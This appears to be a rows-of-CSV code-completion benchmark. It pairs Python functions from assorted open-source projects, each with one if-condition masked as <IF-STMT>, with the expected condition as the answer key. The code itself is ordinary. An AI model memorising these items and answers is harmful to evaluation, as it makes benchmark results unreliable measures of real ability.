3871,"def __init__(self, connection):<tab>self.username = connection.username<tab>self.password = connection.password<tab>self.domain = connection.domain<tab>self.hash = connection.hash<tab>self.lmhash = """"<tab>self.nthash = """"<tab>self.aesKey = connection.aesKey<tab>self.kdcHost = connection.kdcHost<tab>self.kerberos = connection.kerberos<tab>if self.hash is not None:<tab><tab><IF-STMT><tab><tab><tab>self.lmhash, self.nthash = self.hash.split("":"")<tab><tab>else:<tab><tab><tab>self.nthash = self.hash<tab>if self.password is None:<tab><tab>self.password = """"","if self . hash . find ( "":"" ) != - 1 :",174
3872,"def indent_xml(elem, level=0):<tab>""""""Do our pretty printing and make Matt very happy.""""""<tab>i = ""\n"" + level * ""  ""<tab>if elem:<tab><tab>if not elem.text or not elem.text.strip():<tab><tab><tab>elem.text = i + ""  ""<tab><tab>if not elem.tail or not elem.tail.strip():<tab><tab><tab>elem.tail = i<tab><tab>for elem in elem:<tab><tab><tab>indent_xml(elem, level + 1)<tab><tab>if not elem.tail or not elem.tail.strip():<tab><tab><tab>elem.tail = i<tab>else:<tab><tab><IF-STMT><tab><tab><tab>elem.tail = i",if level and ( not elem . tail or not elem . tail . strip ( ) ) :,177
3873,"def add_braces_and_labels(self):<tab>for attr in ""horizontal_parts"", ""vertical_parts"":<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>parts = getattr(self, attr)<tab><tab>for subattr in ""braces"", ""labels"":<tab><tab><tab>if hasattr(parts, subattr):<tab><tab><tab><tab>self.add(getattr(parts, subattr))","if not hasattr ( self , attr ) :",97
3874,"def error_messages(file_list, files_removed):<tab>if files_removed is None:<tab><tab>return<tab>for remove_this, reason in files_removed:<tab><tab>if file_list is not None:<tab><tab><tab>file_list.remove(remove_this)<tab><tab><IF-STMT><tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   is not PNG file format"")<tab><tab>elif reason == 1:<tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   already exists"")<tab><tab>elif reason == 2:<tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   file unreadable"")",if reason == 0 :,161
3875,"def keep_vocab_item(word, count, min_count, trim_rule=None):<tab>default_res = count >= min_count<tab>if trim_rule is None:<tab><tab>return default_res<tab>else:<tab><tab>rule_res = trim_rule(word, count, min_count)<tab><tab>if rule_res == RULE_KEEP:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return default_res",elif rule_res == RULE_DISCARD :,125
3876,"def func(x0):<tab>bind = 0<tab>backups = []<tab>vinputs = []<tab>for i, i0 in zip(inputs, inputs0):<tab><tab>if i is None:  # Optional argument<tab><tab><tab>continue<tab><tab>vinputs += [i]<tab><tab><IF-STMT>  # Not need backward<tab><tab><tab>i.d[...] = x0[bind : bind + i.size].reshape(i.shape)<tab><tab><tab>bind += i.size<tab><tab>backups.append(i.d.copy())<tab>f.forward(vinputs, outputs)<tab>for ind, i in enumerate(inputs):<tab><tab>if i is None:  # Optional argument<tab><tab><tab>continue<tab><tab>i.d[...] = backups[ind]<tab>return sum([np.sum(o.g * o.d) for o in outputs])",if i0 is not None :,200
3877,"def _handle_js_events(self, change):<tab>if self.js_events:<tab><tab>if self.event_handlers:<tab><tab><tab>for event in self.js_events:<tab><tab><tab><tab>event_name = event[""name""]<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.event_handlers[event_name](event[""detail""])<tab><tab># clears the event queue.<tab><tab>self.js_events = []",if event_name in self . event_handlers :,113
3878,"def validate(leaves):<tab>for leaf in leaves:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif leaf.has_form(""List"", None) or leaf.has_form(""Association"", None):<tab><tab><tab>if validate(leaf.leaves) is not True:<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>return False<tab>return True","if leaf . has_form ( ( ""Rule"" , ""RuleDelayed"" ) , 2 ) :",97
3879,"def ascii85decode(data):<tab>n = b = 0<tab>out = """"<tab>for c in data:<tab><tab>if ""!"" <= c and c <= ""u"":<tab><tab><tab>n += 1<tab><tab><tab>b = b * 85 + (ord(c) - 33)<tab><tab><tab>if n == 5:<tab><tab><tab><tab>out += struct.pack("">L"", b)<tab><tab><tab><tab>n = b = 0<tab><tab>elif c == ""z"":<tab><tab><tab>assert n == 0<tab><tab><tab>out += ""\0\0\0\0""<tab><tab>elif c == ""~"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for _ in range(5 - n):<tab><tab><tab><tab><tab>b = b * 85 + 84<tab><tab><tab><tab>out += struct.pack("">L"", b)[: n - 1]<tab><tab><tab>break<tab>return out",if n :,200
3880,"def to_text(self, origin=None, relativize=True, **kw):<tab>next = self.next.choose_relativity(origin, relativize)<tab>text = """"<tab>for (window, bitmap) in self.windows:<tab><tab>bits = []<tab><tab>for i in xrange(0, len(bitmap)):<tab><tab><tab>byte = bitmap[i]<tab><tab><tab>for j in xrange(0, 8):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>bits.append(dns.rdatatype.to_text(window * 256 + i * 8 + j))<tab><tab>text += "" "" + "" "".join(bits)<tab>return ""%s%s"" % (next, text)",if byte & ( 0x80 >> j ) :,177
3881,"def _on_response(self, widget, response):<tab>value = None<tab>if response == Gtk.ResponseType.OK:<tab><tab><IF-STMT><tab><tab><tab>value = self.spinbutton.get_value_as_int()<tab><tab>else:<tab><tab><tab>value = self.spinbutton.get_value()<tab>self.deferred.callback(value)<tab>self.destroy()",if self . value_type is int :,96
3882,"def send_preamble(self):<tab>""""""Transmit version/status/date/server, via self._write()""""""<tab>if self.origin_server:<tab><tab><IF-STMT><tab><tab><tab>self._write(""HTTP/%s %s\r\n"" % (self.http_version, self.status))<tab><tab><tab>if not self.headers.has_key(""Date""):<tab><tab><tab><tab>self._write(""Date: %s\r\n"" % time.asctime(time.gmtime(time.time())))<tab><tab><tab>if self.server_software and not self.headers.has_key(""Server""):<tab><tab><tab><tab>self._write(""Server: %s\r\n"" % self.server_software)<tab>else:<tab><tab>self._write(""Status: %s\r\n"" % self.status)",if self . client_is_modern ( ) :,199
3883,"def _save_postinsts_common(self, dst_postinst_dir, src_postinst_dir):<tab>num = 0<tab>for p in self._get_delayed_postinsts():<tab><tab>bb.utils.mkdirhier(dst_postinst_dir)<tab><tab><IF-STMT><tab><tab><tab>shutil.copy(<tab><tab><tab><tab>os.path.join(src_postinst_dir, p + "".postinst""),<tab><tab><tab><tab>os.path.join(dst_postinst_dir, ""%03d-%s"" % (num, p)),<tab><tab><tab>)<tab><tab>num += 1","if os . path . exists ( os . path . join ( src_postinst_dir , p + "".postinst"" ) ) :",165
3884,"def edge_data_from_bmesh_edges(bm, edge_data):<tab>initial_index = bm.edges.layers.int.get(""initial_index"")<tab>if initial_index is None:<tab><tab>raise Exception(""bmesh has no initial_index layer"")<tab>edge_data_out = []<tab>n_edge_data = len(edge_data)<tab>for edge in bm.edges:<tab><tab>idx = edge[initial_index]<tab><tab><IF-STMT><tab><tab><tab>debug(""Unexisting edge_data[%s] [0 - %s]"", idx, n_edge_data)<tab><tab><tab>edge_data_out.append(None)<tab><tab>else:<tab><tab><tab>edge_data_out.append(edge_data[idx])<tab>return edge_data_out",if idx < 0 or idx >= n_edge_data :,198
3885,"def write(self, data):<tab>try:<tab><tab>c_written = DWORD()<tab><tab>buffer = create_string_buffer(data)<tab><tab><IF-STMT><tab><tab><tab>raise WinError()<tab>except:<tab><tab>self.close()","if not WriteFile ( self . pStdin , buffer , len ( buffer ) , byref ( c_written ) , None ) :",82
3886,"def get_icon(svg_path, size):<tab>pixbuf = GdkPixbuf.Pixbuf.new_from_file_at_scale(svg_path, size, size, True)<tab>data = bytearray(pixbuf.get_pixels())<tab>channels = pixbuf.get_n_channels()<tab>assert channels == 4<tab># https://en.wikipedia.org/wiki/PackBits<tab># no real compression going on here..<tab>new_data = bytearray()<tab>for c in range(3):<tab><tab>x = 0<tab><tab>for i in range(0, len(data), 4):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>new_data.append(127)<tab><tab><tab>new_data.append(data[i + c])<tab><tab><tab>x += 1<tab>return new_data",if x == 0 or x % 128 == 0 :,194
3887,"def _get_instance_attribute(<tab>self, attr, default=None, defaults=None, incl_metadata=False):<tab>if self.instance is None or not hasattr(self.instance, attr):<tab><tab>if incl_metadata and attr in self.parsed_metadata:<tab><tab><tab>return self.parsed_metadata[attr]<tab><tab>elif defaults is not None:<tab><tab><tab>for value in defaults:<tab><tab><tab><tab>if callable(value):<tab><tab><tab><tab><tab>value = value()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return value<tab><tab>return default<tab>return getattr(self.instance, attr)",if value is not None :,149
3888,"def forward(self, x):<tab>if self.ffn_type in (1, 2):<tab><tab>x0 = self.wx0(x)<tab><tab><IF-STMT><tab><tab><tab>x1 = x<tab><tab>elif self.ffn_type == 2:<tab><tab><tab>x1 = self.wx1(x)<tab><tab>out = self.output(x0 * x1)<tab>out = self.dropout(out)<tab>out = self.LayerNorm(out + x)<tab>return out",if self . ffn_type == 1 :,122
3889,"def load(cls):<tab>if not cls._loaded:<tab><tab>cls.log.debug(""Loading tile_sets..."")<tab><tab><IF-STMT><tab><tab><tab>cls._find_tile_sets(PATHS.TILE_SETS_DIRECTORY)<tab><tab>else:<tab><tab><tab>cls.tile_sets = JsonDecoder.load(PATHS.TILE_SETS_JSON_FILE)<tab><tab>cls.log.debug(""Done!"")<tab><tab>cls._loaded = True",if not horizons . globals . fife . use_atlases :,120
3890,"def headerData(self, section, orientation, role=Qt.DisplayRole):<tab>if role == Qt.TextAlignmentRole:<tab><tab>if orientation == Qt.Horizontal:<tab><tab><tab>return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter))<tab><tab>return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter))<tab>if role != Qt.DisplayRole:<tab><tab>return to_qvariant()<tab>if orientation == Qt.Horizontal:<tab><tab>if section == NAME:<tab><tab><tab>return to_qvariant(""Name"")<tab><tab><IF-STMT><tab><tab><tab>return to_qvariant(""Version"")<tab><tab>elif section == ACTION:<tab><tab><tab>return to_qvariant(""Action"")<tab><tab>elif section == DESCRIPTION:<tab><tab><tab>return to_qvariant(""Description"")<tab>return to_qvariant()",elif section == VERSION :,192
3891,"def find_enabled_item(self, e):<tab>x, y = e.local<tab>if (<tab><tab>0<tab><tab><= x<tab><tab>< (<tab><tab><tab>self.width - self.margin - self.scroll_button_size<tab><tab><tab>if self.scrolling<tab><tab><tab>else self.width<tab><tab>)<tab>):<tab><tab>h = self.font.get_linesize()<tab><tab>i = (y - h // 2) // h + self.scroll<tab><tab>items = self._items<tab><tab>if 0 <= i < len(items):<tab><tab><tab>item = items[i]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return item",if item . enabled :,160
3892,"def set_parallel_limit(environment):<tab>parallel_limit = environment.get(""COMPOSE_PARALLEL_LIMIT"")<tab>if parallel_limit:<tab><tab>try:<tab><tab><tab>parallel_limit = int(parallel_limit)<tab><tab>except ValueError:<tab><tab><tab>raise errors.UserError(<tab><tab><tab><tab>'COMPOSE_PARALLEL_LIMIT must be an integer (found: ""{}"")'.format(<tab><tab><tab><tab><tab>environment.get(""COMPOSE_PARALLEL_LIMIT"")<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise errors.UserError(""COMPOSE_PARALLEL_LIMIT can not be less than 2"")<tab><tab>parallel.GlobalLimit.set_global_limit(parallel_limit)",if parallel_limit <= 1 :,178
3893,"def migrate_identifier(self, raw_identifier: int):<tab>if self.unique_cog_identifier in self.data:<tab><tab># Data has already been migrated<tab><tab>return<tab>poss_identifiers = [str(raw_identifier), str(hash(raw_identifier))]<tab>for ident in poss_identifiers:<tab><tab><IF-STMT><tab><tab><tab>self.data[self.unique_cog_identifier] = self.data[ident]<tab><tab><tab>del self.data[ident]<tab><tab><tab>_save_json(self.data_path, self.data)<tab><tab><tab>break",if ident in self . data :,140
3894,"def _memoize(*args, **kwargs):<tab>str_args = []<tab>for arg in args:<tab><tab><IF-STMT><tab><tab><tab>str_args.append(six.text_type(arg))<tab><tab>else:<tab><tab><tab>str_args.append(arg)<tab>args_ = "","".join(<tab><tab>list(str_args) + [""{0}={1}"".format(k, kwargs[k]) for k in sorted(kwargs)]<tab>)<tab>if args_ not in cache:<tab><tab>cache[args_] = func(*args, **kwargs)<tab>return cache[args_]","if not isinstance ( arg , six . string_types ) :",146
3895,"def extract(self):<tab>for battery in self.vars:<tab><tab>for line in dopen(""/proc/acpi/battery/"" + battery + ""/state"").readlines():<tab><tab><tab>l = line.split()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if l[0:2] == [""remaining"", ""capacity:""]:<tab><tab><tab><tab>remaining = int(l[2])<tab><tab><tab><tab>continue<tab><tab><tab>elif l[0:2] == [""present"", ""rate:""]:<tab><tab><tab><tab>rate = int(l[2])<tab><tab><tab><tab>continue<tab><tab>if rate and remaining:<tab><tab><tab>self.val[battery] = remaining * 60 / rate<tab><tab>else:<tab><tab><tab>self.val[battery] = -1",if len ( l ) < 3 :,185
3896,"def version_iter(q, limit=500, offset=0):<tab>q[""limit""] = limit<tab>q[""offset""] = offset<tab>while True:<tab><tab>url = base_url() + ""/version""<tab><tab>v = jsonload(url)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>for i in query(q):<tab><tab><tab>yield i<tab><tab>q[""offset""] += limit",if not v :,97
3897,"def _letf_btn_press(self, event):<tab>try:<tab><tab>elem = self.identify(event.x, event.y)<tab><tab>index = self.index(""@%d,%d"" % (event.x, event.y))<tab><tab><IF-STMT><tab><tab><tab>self.state([""pressed""])<tab><tab><tab>self.pressed_index = index<tab>except Exception:<tab><tab># may fail, if clicked outside of tab<tab><tab>return","if ""closebutton"" in elem :",112
3898,"def get_location(self, dist, dependency_links):<tab>for url in dependency_links:<tab><tab>egg_fragment = Link(url).egg_fragment<tab><tab>if not egg_fragment:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>## FIXME: will this work when a package has - in the name?<tab><tab><tab>key = ""-"".join(egg_fragment.split(""-"")[:-1]).lower()<tab><tab>else:<tab><tab><tab>key = egg_fragment<tab><tab>if key == dist.key:<tab><tab><tab>return url.split(""#"", 1)[0]<tab>return None","if ""-"" in egg_fragment :",141
3899,"def viewTreeItemClicked(self, event):<tab>if DEBUG:<tab><tab>print(""viewTreeitemClicked:"", event.__dict__, file=sys.stderr)<tab>self.unmarkTargets()<tab>vuid = self.viewTree.viewTree.identify_row(event.y)<tab>if vuid:<tab><tab>view = self.vc.viewsById[vuid]<tab><tab><IF-STMT><tab><tab><tab>coords = view.getCoords()<tab><tab><tab>if view.isTarget():<tab><tab><tab><tab>self.markTarget(coords[0][0], coords[0][1], coords[1][0], coords[1][1])<tab><tab><tab>self.viewDetails.set(view)",if view :,162
3900,"def getVar(self, name):<tab>value = self.tinfoil.run_command(""dataStoreConnectorFindVar"", self.dsindex, name)<tab>overrides = None<tab>if isinstance(value, dict):<tab><tab>if ""_connector_origtype"" in value:<tab><tab><tab>value[""_content""] = self.tinfoil._reconvert_type(<tab><tab><tab><tab>value[""_content""], value[""_connector_origtype""]<tab><tab><tab>)<tab><tab><tab>del value[""_connector_origtype""]<tab><tab><IF-STMT><tab><tab><tab>overrides = value[""_connector_overrides""]<tab><tab><tab>del value[""_connector_overrides""]<tab>return value, overrides","if ""_connector_overrides"" in value :",158
3901,"def sample(self, **config):<tab>""""""Sample a configuration from this search space.""""""<tab>ret = []<tab>kwspaces = self.kwspaces<tab>striped_keys = [k.split(SPLITTER)[0] for k in config.keys()]<tab>for idx, obj in enumerate(self.data):<tab><tab>if isinstance(obj, NestedSpace):<tab><tab><tab>sub_config = _strip_config_space(config, prefix=str(idx))<tab><tab><tab>ret.append(obj.sample(**sub_config))<tab><tab><IF-STMT><tab><tab><tab>ret.append(config[str(idx)])<tab><tab>else:<tab><tab><tab>ret.append(obj)<tab>return ret","elif isinstance ( obj , SimpleSpace ) :",165
3902,"def main():<tab>for filename in sys.argv[1:]:<tab><tab><IF-STMT><tab><tab><tab>print(filename, ""Directory!"")<tab><tab><tab>continue<tab><tab>with open(filename, ""rb"") as f:<tab><tab><tab>data = f.read()<tab><tab>if b""\0"" in data:<tab><tab><tab>print(filename, ""Binary!"")<tab><tab><tab>continue<tab><tab>newdata = data.replace(b""\r\n"", b""\n"")<tab><tab>if newdata != data:<tab><tab><tab>print(filename)<tab><tab><tab>with open(filename, ""wb"") as f:<tab><tab><tab><tab>f.write(newdata)",if os . path . isdir ( filename ) :,157
3903,"def normalize_crlf(tree):<tab>for elem in tree.getiterator():<tab><tab>if elem.text:<tab><tab><tab>elem.text = elem.text.replace(""\r\n"", ""\n"")<tab><tab><IF-STMT><tab><tab><tab>elem.tail = elem.tail.replace(""\r\n"", ""\n"")",if elem . tail :,76
3904,"def RegisterValue(self, value):<tab>""""""Puts a given value into an appropriate bin.""""""<tab>if self.bins:<tab><tab>for b in self.bins:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>b.num += 1<tab><tab><tab><tab>return<tab><tab>self.bins[-1].num += 1",if b . range_max_value > value :,82
3905,"def all_commands():<tab>all_cmds = []<tab>for bp in BINPATHS:<tab><tab>cmds = [<tab><tab><tab>fn[:-3]<tab><tab><tab>for fn in os.listdir(bp)<tab><tab><tab><IF-STMT><tab><tab><tab>and not fn.startswith(""."")<tab><tab><tab>and os.path.isfile(os.path.join(bp, fn))<tab><tab>]<tab><tab>all_cmds += cmds<tab>all_cmds.sort()<tab>return all_cmds","if fn . endswith ( "".py"" )",116
3906,"def base64_encode_image_mapper(self, tag, url):<tab>if tag == ""img"":<tab><tab>if url in self.kp_images:<tab><tab><tab>image_data = base64.b64encode(self.kp_images[url])<tab><tab><tab>image_mimetype = mimetypes.guess_type(url)[0]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ""data:{};base64, "".format(image_mimetype) + image_data.decode(<tab><tab><tab><tab><tab>""utf-8""<tab><tab><tab><tab>)<tab>return None",if image_mimetype is not None :,138
3907,"def validate_input(self):<tab>if self.validation_fn:<tab><tab>success, err = self.validation_fn(self.str)<tab><tab><IF-STMT><tab><tab><tab>spaces = "" "" * self.textwin_width<tab><tab><tab>self.textwin.addstr(self.y + 2, 0, spaces)<tab><tab><tab>self.textwin.addstr(self.y + 2, 0, err, curses.color_pair(4))<tab><tab>return success<tab>else:<tab><tab>return True",if not success :,120
3908,"def start_prompt(self):<tab>""""""Start the interpreter.""""""<tab>logger.show(""Coconut Interpreter:"")<tab>logger.show(""(type 'exit()' or press Ctrl-D to end)"")<tab>self.start_running()<tab>while self.running:<tab><tab>try:<tab><tab><tab>code = self.get_input()<tab><tab><tab>if code:<tab><tab><tab><tab>compiled = self.handle_input(code)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.execute(compiled, use_eval=None)<tab><tab>except KeyboardInterrupt:<tab><tab><tab>printerr(""\nKeyboardInterrupt"")",if compiled :,142
3909,"def __exit__(self, exc_type, exc_val, exc_tb):<tab>if self.channel and self.channel.connection:<tab><tab>conn_errors = self.channel.connection.client.connection_errors<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>self.cancel()<tab><tab><tab>except Exception:<tab><tab><tab><tab>pass","if not isinstance ( exc_val , conn_errors ) :",93
3910,"def pack(data, size, endian):<tab>buf = []<tab>for i in data:<tab><tab>num = int(i)<tab><tab><IF-STMT><tab><tab><tab>num += 1 << (size * 8)<tab><tab>d = [b""\x00""] * size<tab><tab>i = size - 1<tab><tab>while i >= 0:<tab><tab><tab>b = num & 255<tab><tab><tab>d[i] = bytes((b,)) if PY3 else chr(b)<tab><tab><tab>num >>= 8<tab><tab><tab>i -= 1<tab><tab>if endian == ""<"":<tab><tab><tab>d = b"""".join(d[i : i + 1][0] for i in reversed(xrange(len(d))))<tab><tab>else:<tab><tab><tab>d = b"""".join(d)<tab><tab>buf.append(d)<tab>return b"""".join(buf)",if num < 0 :,198
3911,"def _sample_new_noise_and_add(self, *, tf_sess=None, override=False):<tab>if self.framework == ""tf"":<tab><tab><IF-STMT><tab><tab><tab>tf_sess.run(self.tf_remove_noise_op)<tab><tab>tf_sess.run(self.tf_sample_new_noise_and_add_op)<tab>else:<tab><tab>if override and self.weights_are_currently_noisy:<tab><tab><tab>self._remove_noise()<tab><tab>self._sample_new_noise()<tab><tab>self._add_stored_noise()<tab>self.weights_are_currently_noisy = True",if override and self . weights_are_currently_noisy :,162
3912,"def hdfs_link_js(url):<tab>link = ""javascript:void(0)""<tab>if url:<tab><tab>path = Hdfs.urlsplit(url)[2]<tab><tab>if path:<tab><tab><tab>link = (<tab><tab><tab><tab>""/filebrowser/view=%s""<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab>else ""/filebrowser/home_relative_view=/%s""<tab><tab><tab>) % path<tab>return link",if path . startswith ( posixpath . sep ),111
3913,"def set_xticklabels(self, labels=None, step=None, **kwargs):<tab>""""""Set x axis tick labels on the bottom row of the grid.""""""<tab>for ax in self.axes[-1, :]:<tab><tab>if labels is None:<tab><tab><tab>labels = [l.get_text() for l in ax.get_xticklabels()]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>xticks = ax.get_xticks()[::step]<tab><tab><tab><tab>labels = labels[::step]<tab><tab><tab><tab>ax.set_xticks(xticks)<tab><tab>ax.set_xticklabels(labels, **kwargs)<tab>return self",if step is not None :,145
3914,"def _get_statement_from_file(user, fs, snippet):<tab>script_path = snippet[""statementPath""]<tab>if script_path:<tab><tab>script_path = script_path.replace(""hdfs://"", """")<tab><tab><IF-STMT><tab><tab><tab>return fs.do_as_user(user, fs.read, script_path, 0, 16 * 1024 ** 2)","if fs . do_as_user ( user , fs . isfile , script_path ) :",104
3915,def doWorkUnit(self):<tab>if len(self.workers):<tab><tab>try:<tab><tab><tab>w = self.workers.popleft()<tab><tab><tab>w.next()<tab><tab><tab>self.workers.append(w)<tab><tab>except StopIteration:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.invalidate()<tab>else:<tab><tab>time.sleep(0.001),"if hasattr ( w , ""needsRedraw"" ) and w . needsRedraw :",105
3916,"def _find_l1_phash_mul(cdict):<tab>candidate_lengths = _find_candidate_lengths_mul(cdict.tuple2int)<tab>for p in candidate_lengths:<tab><tab>hash_f = hashmul.hashmul_t(p)<tab><tab><IF-STMT><tab><tab><tab>return l1_phash_t(cdict, hash_f)<tab><tab>del hash_f<tab>return None",if hash_f . is_perfect ( iter ( cdict . tuple2int . values ( ) ) ) :,118
3917,"def _find_next_tab_stop(self, direction):<tab>old_focus = self._focus<tab>self._focus += direction<tab>while self._focus != old_focus:<tab><tab>if self._focus < 0:<tab><tab><tab>self._focus = len(self._layouts) - 1<tab><tab>if self._focus >= len(self._layouts):<tab><tab><tab>self._focus = 0<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._layouts[self._focus].focus(force_first=True)<tab><tab><tab>else:<tab><tab><tab><tab>self._layouts[self._focus].focus(force_last=True)<tab><tab><tab>break<tab><tab>except IndexError:<tab><tab><tab>self._focus += direction",if direction > 0 :,177
3918,"def _get_py_flags(self):<tab>res = dict(self.flags)<tab>cflags = res.pop(""cflags"", """")<tab>for fl in cflags.split(""|""):<tab><tab>fl = fl.strip()<tab><tab>if fl == ""GA_USE_DOUBLE"":<tab><tab><tab>res[""have_double""] = True<tab><tab><IF-STMT><tab><tab><tab>res[""have_small""] = True<tab><tab>if fl == ""GA_USE_COMPLEX"":<tab><tab><tab>res[""have_complex""] = True<tab><tab>if fl == ""GA_USE_HALF"":<tab><tab><tab>res[""have_half""] = True<tab>return res","if fl == ""GA_USE_SMALL"" :",160
3919,"def _install_provision_configs(self):<tab>config = self._config.plugins[self.full_name]<tab>files = config.get(""provision_config_files"", [])<tab>if files:<tab><tab><IF-STMT><tab><tab><tab>log.critical(""Error installing provisioning configs"")<tab><tab><tab>return False<tab><tab>else:<tab><tab><tab>log.debug(""Provision config files successfully installed"")<tab><tab><tab>return True<tab>else:<tab><tab>log.debug(""No provision config files configured"")<tab><tab>return True","if not install_provision_configs ( files , self . _mountpoint ) :",132
3920,"def postfile(self):<tab>for clientip, serverips in self.client_conns.items():<tab><tab>target_count = len(serverips)<tab><tab>S = min((len(self.server_conns[serverip]) for serverip in serverips))<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># TODO implement whitelist<tab><tab>self.write(<tab><tab><tab>""Scanning IP: {} / S score: {:.1f} / Number of records: {}"".format(<tab><tab><tab><tab>clientip, S, target_count<tab><tab><tab>)<tab><tab>)",if S > 2 or target_count < 5 :,144
3921,"def update_defaults(self, *values, **kwargs):<tab>for value in values:<tab><tab><IF-STMT><tab><tab><tab>self.DEFAULT_CONFIGURATION.update(value)<tab><tab>elif isinstance(value, types.ModuleType):<tab><tab><tab>self.__defaults_from_module(value)<tab><tab>elif isinstance(value, str):<tab><tab><tab>if os.path.exists(value):<tab><tab><tab><tab>self.__defaults_from_file(value)<tab><tab><tab>else:<tab><tab><tab><tab>logger.warning(""Configuration file {} does not exist."".format(value))<tab><tab>elif isinstance(value, type(None)):<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise ValueError(""Cannot interpret {}"".format(value))<tab>self.DEFAULT_CONFIGURATION.update(kwargs)",if type ( value ) == dict :,184
3922,"def __init__(self, aList):<tab>for element in aList:<tab><tab><IF-STMT><tab><tab><tab>if element.tag == element[0].tag:<tab><tab><tab><tab>self.append(ListParser(element))<tab><tab><tab>else:<tab><tab><tab><tab>self.append(DictParser(element))<tab><tab>elif element.text:<tab><tab><tab>text = element.text.strip()<tab><tab><tab>if text:<tab><tab><tab><tab>self.append(text)",if len ( element ) > 0 :,116
3923,"def _get_py_flags(self):<tab>res = dict(self.flags)<tab>cflags = res.pop(""cflags"", """")<tab>for fl in cflags.split(""|""):<tab><tab>fl = fl.strip()<tab><tab><IF-STMT><tab><tab><tab>res[""have_double""] = True<tab><tab>if fl == ""GA_USE_SMALL"":<tab><tab><tab>res[""have_small""] = True<tab><tab>if fl == ""GA_USE_COMPLEX"":<tab><tab><tab>res[""have_complex""] = True<tab><tab>if fl == ""GA_USE_HALF"":<tab><tab><tab>res[""have_half""] = True<tab>return res","if fl == ""GA_USE_DOUBLE"" :",160
3924,"def consume_bytes(data):<tab>state_machine.receive_data(data)<tab>while True:<tab><tab>event = state_machine.next_event()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>elif isinstance(event, h11.InformationalResponse):<tab><tab><tab># Ignore 1xx responses<tab><tab><tab>continue<tab><tab>elif isinstance(event, h11.Response):<tab><tab><tab># We have our response! Save it and get out of here.<tab><tab><tab>context[""h11_response""] = event<tab><tab><tab>raise LoopAbort<tab><tab>else:<tab><tab><tab># Can't happen<tab><tab><tab>raise RuntimeError(""Unexpected h11 event {}"".format(event))",if event is h11 . NEED_DATA :,166
3925,"def status_string(self):<tab>if not self.live:<tab><tab>if self.expired:<tab><tab><tab>return _(""expired"")<tab><tab>elif self.approved_schedule:<tab><tab><tab>return _(""scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""in moderation"")<tab><tab>else:<tab><tab><tab>return _(""draft"")<tab>else:<tab><tab>if self.approved_schedule:<tab><tab><tab>return _(""live + scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""live + in moderation"")<tab><tab><IF-STMT><tab><tab><tab>return _(""live + draft"")<tab><tab>else:<tab><tab><tab>return _(""live"")",elif self . has_unpublished_changes :,166
3926,"def _update_input_entries(entries):<tab>for entry in entries:<tab><tab>comma = entry.get(""comma_separated"", False)<tab><tab><IF-STMT><tab><tab><tab>entry[""regex""] = r""([^{}\[\]]*)\{"" + entry[""regex""]<tab><tab>else:<tab><tab><tab>entry[""regex""] = r""([^,{}\[\]]*)\{"" + entry[""regex""]<tab><tab>entry[""type""] = ""input""",if comma :,98
3927,"def get_release():<tab>regexp = re.compile(r""^__version__\W*=\W*'([\d.abrc]+)'"")<tab>here = os.path.dirname(__file__)<tab>root = os.path.dirname(here)<tab>init_py = os.path.join(root, ""aiomysql"", ""__init__.py"")<tab>with open(init_py) as f:<tab><tab>for line in f:<tab><tab><tab>match = regexp.match(line)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return match.group(1)<tab><tab>else:<tab><tab><tab>raise RuntimeError(""Cannot find version in aiomysql/__init__.py"")",if match is not None :,151
3928,"def add_to_auto_transitions(cls, base):<tab>result = {}<tab>for name, method in base.__dict__.items():<tab><tab>if callable(method) and hasattr(method, ""_django_fsm""):<tab><tab><tab>for name, transition in method._django_fsm.transitions.items():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>result.update({name: method})<tab>return result","if transition . custom . get ( ""auto"" ) :",103
3929,"def _paginate(self, get_page, page_size):<tab>for page in itertools.count(start=1):<tab><tab>params = {""page"": page, ""per_page"": page_size}<tab><tab>response, items = get_page(params)<tab><tab>for item in items:<tab><tab><tab>yield item<tab><tab>if self._is_last_page(response):<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break",if len ( items ) < page_size :,111
